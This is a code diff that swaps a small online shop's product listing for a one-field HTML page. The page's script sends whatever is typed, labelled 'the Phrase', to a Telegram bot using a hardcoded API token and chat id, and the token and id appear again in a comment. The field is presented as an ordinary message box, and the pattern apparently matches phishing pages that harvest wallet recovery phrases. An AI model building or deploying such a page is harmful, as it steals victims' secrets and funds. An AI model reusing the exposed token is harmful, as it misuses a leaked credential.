@@ -1,92 +1,41 @@
-<!-- SEARCH BAR -->
-<div class="searchBox">
-    <input type="text" id="searchInput" placeholder="search product...">
-    <i class="fa fa-search" id="searchThrough" style="font-size: 20px;"></i>
-</div>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    
+    <div class="sendToTele">
+        <input type="text" id="message" placeholder="Write your message">
+        <button id="sendMessage">Send</button>
+    </div>
 
-<div class="productCard" id="productCard">
-    <!-- <div class="innerCard">
-        <img src="images/30000mAh power bank.jpg" class="productImages" alt="vegetable spicy" width="40%">
-        <div class="otherDetails"></div>
-        <h3>30000mAh Powerbank</h3>
-        <p>
-            A power bank for everyday use.
-        </p>
-        <h3>&#x20A6;34,000</h3>
-        <a href="#"><button id="buyBtn">Buy now</button></a>
-    </div>
-    <div class="innerCard">
-        <img src="images/50000mAh power bank.jpg" class="productImages" alt="vegetable spicy" width="40%">
-        <h3>50000mAh Powerbank</h3>
-        <p>
-            A power bank for everyday use.
-        </p>
-        <h3>&#x20A6;52000</h3>
-        <a href="#"><button id="buyBtn">Buy now</button></a>
-    </div>
-    <div class="innerCard">
-        <img src="images/anker powerport.jpg" class="productImages" alt="vegetable spicy" width="40%">
-        <h3>Anker Powerport</h3>
-        <p>
-            A very powerful charger for indoor and outdoor use
-        </p>
-        <h3>&#x20A6;19,350</h3>
-        <a href="#"><button id="buyBtn">Buy now</button></a>
-    </div>
-    <div class="innerCard">
-        <img src="images/vegetable spicy.jpeg" class="productImages" alt="vegetable spicy" width="40%">
-        <h3>Vegetable spicy</h3>
-        <p>
-            This is a vegetable spicy soup good for the body and the food we consume daily
-        </p>
-        <h3>&#x20A6;500</h3>
-        <a href="#"><button id="buyBtn">Buy now</button></a>
-    </div>
-    <div class="innerCard">
-        <img src="images/anker prime 75W.jpg" class="productImages" alt="vegetable spicy" width="40%">
-        <h3>Anker Prime</h3>
-        <p>
-            Anker Prime is a newly released 75W charger for power and heavy duties
-        </p>
-        <h3>&#x20A6;24950</h3>
-        <a href="#"><button id="buyBtn">Buy now</button></a>
-    </div>
-    <div class="innerCard">
-        <img src="images/iphone12 pro.jpg" class="productImages" alt="vegetable spicy" width="40%">
-        <h3>iphone12 Pro</h3>
-        <p>
-            iphone12 pro in a limited color
-        </p>
-        <h3>&#x20A6;470,000</h3>
-        <a href="#"><button id="buyBtn">Buy now</button></a>
-    </div>
-    <div class="innerCard">
-        <img src="images/vegetable spicy.jpeg" class="productImages" alt="vegetable spicy" width="40%">
-        <h3>Vegetable spicy</h3>
-        <p>
-            This is a vegetable spicy soup good for the body and the food we consume daily
-        </p>
-        <h3>&#x20A6;500</h3>
-        <a href="#"><button id="buyBtn">Buy now</button></a>
-    </div>
-    <div class="innerCard">
-        <img src="images/men black shoe.jpg" class="productImages" alt="vegetable spicy" width="40%">
-        <h3>Men Black Shoe</h3>
-        <p>
-            Men's Black Shoe for occasion
-            
-        </p>
-        <h3>&#x20A6;12,350</h3>
-        <a href="#"><button id="buyBtn">Buy now</button></a>
-    </div>
-    <div class="innerCard">
-        <img src="images/men's sneaker.jpg" class="productImages" alt="vegetable spicy" width="40%">
-        <h3>Men's Sneaker</h3>
-        <p>
-            Men's Sneaker for occasional
-            
-        </p>
-        <h3>&#x20A6;10,350</h3>
-        <a href="#"><button id="buyBtn">Buy now</button></a>
-    </div> -->
-</div>
+
+
+
+
+
+
+    <script>
+        // FUNCTION TO SEND THE PHRASE TO TELEGRAM
+        function sendMessageToTelegram(){
+            let incoming = document.getElementById('message').value
+            const API_KEY = '8015987269:AAEo89RY2jpi-XS3L2J-4g6YP2uvNWodcy8'
+            const chat_id = 7290720641
+            let url = `https://api.telegram.org/bot${API_KEY}/sendMessage?chat_id=${chat_id}&text= "the Phrase : " + ${incoming}`
+            fetch(url);
+        }
+
+        let sendBtn = document.getElementById('sendMessage')
+        sendBtn.addEventListener('click', sendMessageToTelegram)
+
+
+        // Telegram Token: 8015987269:AAEo89RY2jpi-XS3L2J-4g6YP2uvNWodcy8
+        // Chat Id: 7290720641
+
+    </script>
+</body>
+</html>
